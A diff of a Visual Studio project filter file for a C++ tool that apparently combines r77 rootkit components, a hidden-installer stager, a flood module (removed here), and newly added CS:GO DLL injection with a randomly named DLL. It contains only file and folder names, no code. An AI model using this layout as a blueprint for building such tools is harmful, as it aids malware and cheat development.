@@ -88,6 +88,15 @@
     <Filter Include="头文件\Encoding">
       <UniqueIdentifier>{72533af7-41d2-4bff-be1f-e77fd253279a}</UniqueIdentifier>
     </Filter>
+    <Filter Include="源文件\函数模块\Injection">
+      <UniqueIdentifier>{40ae85be-b1db-46c9-b0c7-aa2430e8623c}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\Injection\CS:GO">
+      <UniqueIdentifier>{5b521c73-8f1d-471a-915b-5d89415fcff4}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="资源文件\CSGO">
+      <UniqueIdentifier>{00db9e20-b257-41ab-a9e3-f3c2367d9155}</UniqueIdentifier>
+    </Filter>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="control.cpp">
@@ -123,20 +132,14 @@
     <ClCompile Include="search_regedit_information.cpp">
       <Filter>源文件\函数模块\查询</Filter>
     </ClCompile>
-    <ClCompile Include="uoload_or_download-function.cpp">
-      <Filter>源文件\函数模块\Other</Filter>
-    </ClCompile>
     <ClCompile Include="Socket_Tcp_Server.cpp">
       <Filter>源文件\函数模块\连接/Socket套接字</Filter>
     </ClCompile>
-    <ClCompile Include="Flood.cpp">
-      <Filter>源文件\函数模块\TCP&amp;UDP</Filter>
-    </ClCompile>
-    <ClCompile Include="hand file\Socket\Sockets.cpp">
-      <Filter>源文件\函数模块\Socket</Filter>
-    </ClCompile>
     <ClCompile Include="hand file\Encoding\URLEncoding.cpp">
       <Filter>源文件\函数模块\加密连接</Filter>
+    </ClCompile>
+    <ClCompile Include="CSGO_Injection.cpp">
+      <Filter>源文件\函数模块\Injection\CS:GO</Filter>
     </ClCompile>
   </ItemGroup>
   <ItemGroup>
@@ -167,12 +170,6 @@
     <ClInclude Include="hand file\r77\r77 hand\r77api.h">
       <Filter>头文件\hide System Project</Filter>
     </ClInclude>
-    <ClInclude Include="hand file\Socket\Sockets.h">
-      <Filter>头文件\Socket</Filter>
-    </ClInclude>
-    <ClInclude Include="hand file\Encoding\URLEncoding.h">
-      <Filter>头文件\Encoding</Filter>
-    </ClInclude>
   </ItemGroup>
   <ItemGroup>
     <ResourceCompile Include="0x7E9FB-net.rc">
@@ -189,8 +186,8 @@
     <None Include="hand file\r77\exe file\InstallStager.exe">
       <Filter>资源文件\hide System Porject</Filter>
     </None>
-    <None Include="file\dxgi.dll">
-      <Filter>资源文件\Attack</Filter>
+    <None Include="file\lFcGdB.dll">
+      <Filter>资源文件\CSGO</Filter>
     </None>
   </ItemGroup>
   <ItemGroup>
